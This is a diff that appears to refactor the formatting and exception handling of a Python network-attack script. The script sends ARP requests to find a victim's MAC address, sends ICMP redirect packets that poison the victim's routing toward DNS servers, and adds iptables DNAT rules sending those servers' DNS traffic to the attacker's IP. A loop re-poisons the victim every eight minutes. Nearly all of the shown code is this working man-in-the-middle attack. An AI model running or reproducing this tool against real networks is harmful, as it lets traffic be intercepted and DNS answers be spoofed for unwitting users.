@@ -103,12 +103,9 @@ class Packet():
 		("data", ""),
 	])
 	def __init__(self, **kw):
-		self.fields = OrderedDict(self.__class__.fields)
-		for k,v in kw.items():
-			if callable(v):
-				self.fields[k] = v(self.fields[k])
-			else:
-				self.fields[k] = v
+	   self.fields = OrderedDict(self.__class__.fields)
+	   for k,v in kw.items():
+	      self.fields[k] = v(self.fields[k]) if callable(v) else v
 	def __str__(self):
 		return "".join(map(str, self.fields.values()))
 
@@ -199,25 +196,25 @@ class DummyUDP(Packet):
     ])
 
 def ReceiveArpFrame(DstAddr):
-    s = socket(AF_PACKET, SOCK_RAW)
-    s.settimeout(5)
-    Protocol = 0x0806
-    s.bind((Interface, Protocol))
-    OurMac = s.getsockname()[4].decode('latin-1')
-    Eth = EthARP(SrcMac=OurMac)
-    Arp = ARPWhoHas(DstIP=DstAddr,SenderMac=OurMac)
-    Arp.calculate()
-    final = str(Eth)+str(Arp)
-    try:
-        s.send(NetworkSendBufferPython2or3(final))
-        data = s.recv(1024)
-        DstMac = data[22:28]
-        DestMac = codecs.encode(DstMac, 'hex')
-        PrintMac = ":".join([DestMac[x:x+2].decode('latin-1') for x in range(0, len(DestMac), 2)])
-        return PrintMac,DstMac.decode('latin-1')
-    except:
-        print("[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr))
-        exit(1)
+   s = socket(AF_PACKET, SOCK_RAW)
+   s.settimeout(5)
+   Protocol = 0x0806
+   s.bind((Interface, Protocol))
+   OurMac = s.getsockname()[4].decode('latin-1')
+   Eth = EthARP(SrcMac=OurMac)
+   Arp = ARPWhoHas(DstIP=DstAddr,SenderMac=OurMac)
+   Arp.calculate()
+   final = str(Eth)+str(Arp)
+   try:
+      s.send(NetworkSendBufferPython2or3(final))
+      data = s.recv(1024)
+      DstMac = data[22:28]
+      DestMac = codecs.encode(DstMac, 'hex')
+      PrintMac = ":".join([DestMac[x:x+2].decode('latin-1') for x in range(0, len(DestMac), 2)])
+      return PrintMac,DstMac.decode('latin-1')
+   except Exception:
+      print("[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr))
+      exit(1)
 
 def IcmpRedirectSock(DestinationIP):
     PrintMac,DestMac = ReceiveArpFrame(VictimIP)
@@ -239,25 +236,31 @@ def IcmpRedirectSock(DestinationIP):
     print('\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP))
 
 def FindWhatToDo(ToThisHost2):
-    if ToThisHost2 != None:
-        Show_Help('Hit CTRL-C to kill this script')
-        RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
-    if ToThisHost2 == None:
-        Show_Help(MoreHelp)
-        IcmpRedirectSock(DestinationIP=ToThisHost)
-        exit()
+   if ToThisHost2 != None:
+       Show_Help('Hit CTRL-C to kill this script')
+       RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
+   if ToThisHost2 is None:
+      Show_Help(MoreHelp)
+      IcmpRedirectSock(DestinationIP=ToThisHost)
+      exit()
 
 def RunThisInLoop(host, host2, ip):
-    dns1 = pipes.quote(host)
-    dns2 = pipes.quote(host2)
-    ouripadd = pipes.quote(ip)
-    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
-    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
-    print("[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers.")
-    while True:
-        IcmpRedirectSock(DestinationIP=dns1)
-        IcmpRedirectSock(DestinationIP=dns2)
-        print("[+]Repoisoning the target in 8 minutes...")
-        sleep(480)
+   dns1 = pipes.quote(host)
+   dns2 = pipes.quote(host2)
+   ouripadd = pipes.quote(ip)
+   call(
+       f"iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst {dns1} --dport 53 -j DNAT --to-destination {ouripadd}:53",
+       shell=True,
+   )
+   call(
+       f"iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst {dns2} --dport 53 -j DNAT --to-destination {ouripadd}:53",
+       shell=True,
+   )
+   print("[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers.")
+   while True:
+       IcmpRedirectSock(DestinationIP=dns1)
+       IcmpRedirectSock(DestinationIP=dns2)
+       print("[+]Repoisoning the target in 8 minutes...")
+       sleep(480)
 
 FindWhatToDo(ToThisHost2)
